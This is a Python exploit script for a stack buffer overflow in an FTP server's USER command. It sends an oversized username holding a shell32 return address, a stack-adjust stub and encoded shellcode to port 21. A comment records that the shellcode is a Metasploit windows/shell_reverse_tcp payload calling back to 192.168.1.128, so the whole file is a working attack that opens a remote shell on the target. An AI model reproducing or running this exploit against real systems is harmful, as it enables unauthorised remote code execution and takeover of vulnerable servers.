#!/usr/bin/python

import sys
import socket
hostname = sys.argv[1]
#jmpesp = "\x1c\x80\xf5\x77"
jmpesp = "\x2f\x1d\xf3\x77"
#ret = "\x53\x2b\xab\x71"
#ws2_32

#msfpayload windows/shell_reverse_tcp LHOST=192.168.1.128 R | msfencode -b '\x00\x0a\x0d\x40' -e x86/shikata_ga_nai
#[*] x86/shikata_ga_nai succeeded with size 341 (iteration=1)
payload = (
"\xdd\xc2\xd9\x74\x24\xf4\x5f\x2b\xc9\xbd\x32\xc8\x80\xe5" 
"\xb1\x56\x31\x6f\x18\x03\x6f\x18\x83\xef\xce\x2a\x75\x19" 
"\xc6\x22\x76\xe2\x16\x55\xfe\x07\x27\x47\x64\x43\x15\x57" 
"\xee\x01\x95\x1c\xa2\xb1\x2e\x50\x6b\xb5\x87\xdf\x4d\xf8" 
"\x18\xee\x51\x56\xda\x70\x2e\xa5\x0e\x53\x0f\x66\x43\x92" 
"\x48\x9b\xab\xc6\x01\xd7\x19\xf7\x26\xa5\xa1\xf6\xe8\xa1" 
"\x99\x80\x8d\x76\x6d\x3b\x8f\xa6\xdd\x30\xc7\x5e\x56\x1e" 
"\xf8\x5f\xbb\x7c\xc4\x16\xb0\xb7\xbe\xa8\x10\x86\x3f\x9b" 
"\x5c\x45\x7e\x13\x51\x97\x46\x94\x89\xe2\xbc\xe6\x34\xf5" 
"\x06\x94\xe2\x70\x9b\x3e\x61\x22\x7f\xbe\xa6\xb5\xf4\xcc" 
"\x03\xb1\x53\xd1\x92\x16\xe8\xed\x1f\x99\x3f\x64\x5b\xbe" 
"\x9b\x2c\x38\xdf\xba\x88\xef\xe0\xdd\x75\x50\x45\x95\x94" 
"\x85\xff\xf4\xf0\x6a\x32\x07\x01\xe4\x45\x74\x33\xab\xfd" 
"\x12\x7f\x24\xd8\xe5\x80\x1f\x9c\x7a\x7f\x9f\xdd\x53\x44" 
"\xcb\x8d\xcb\x6d\x73\x46\x0c\x91\xa6\xc9\x5c\x3d\x18\xaa" 
"\x0c\xfd\xc8\x42\x47\xf2\x37\x72\x68\xd8\x4e\xb4\xa6\x38" 
"\x03\x53\xcb\xbe\xb2\xff\x42\x58\xde\xef\x02\xf2\x76\xd2" 
"\x70\xcb\xe1\x2d\x53\x67\xba\xb9\xeb\x61\x7c\xc5\xeb\xa7" 
"\x2f\x6a\x43\x20\xbb\x60\x50\x51\xbc\xac\xf0\x18\x85\x27" 
"\x8a\x74\x44\xd9\x8b\x5c\x3e\x7a\x19\x3b\xbe\xf5\x02\x94" 
"\xe9\x52\xf4\xed\x7f\x4f\xaf\x47\x9d\x92\x29\xaf\x25\x49" 
"\x8a\x2e\xa4\x1c\xb6\x14\xb6\xd8\x37\x11\xe2\xb4\x61\xcf" 
"\x5c\x73\xd8\xa1\x36\x2d\xb7\x6b\xde\xa8\xfb\xab\x98\xb4" 
"\xd1\x5d\x44\x04\x8c\x1b\x7b\xa9\x58\xac\x04\xd7\xf8\x53" 
"\xdf\x53\x08\x1e\x7d\xf5\x81\xc7\x14\x47\xcc\xf7\xc3\x84" 
"\xe9\x7b\xe1\x74\x0e\x63\x80\x71\x4a\x23\x79\x08\xc3\xc6" 
"\x7d\xbf\xe4\xc2"
)
#ret = "\xd6\x13\xab\x71" #ws2_32 here is wrong, you can't success!
ret = "\x6d\x15\x9c\x7c" #7C9c156d shell32
#username = "A" * 485 + "\x59\x54\xc3\x77" + "C" * 4 + "\x81\xc4\x24\xfa\xff\xff" + payload
#username = "A" * 485 + ret + "C" * 4 + "D"*597
username = "A" * 485 + ret + "C" * 4 + "\x81\xc4\x24\xfa\xff\xff" + payload
passwd = "anything"
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    sock.connect((hostname, 21))
except:
    print ("[-] Connection error!")
    sys.exit(1)
r = sock.recv(1024)
print "[+] " + r
sock.send("user %s\r\n" %username)
r = sock.recv(1024)
print "[+] " + r
sock.send("pass %s\r\n" %passwd)
r = sock.recv(1024)
print "[+] " + r
sock.close()
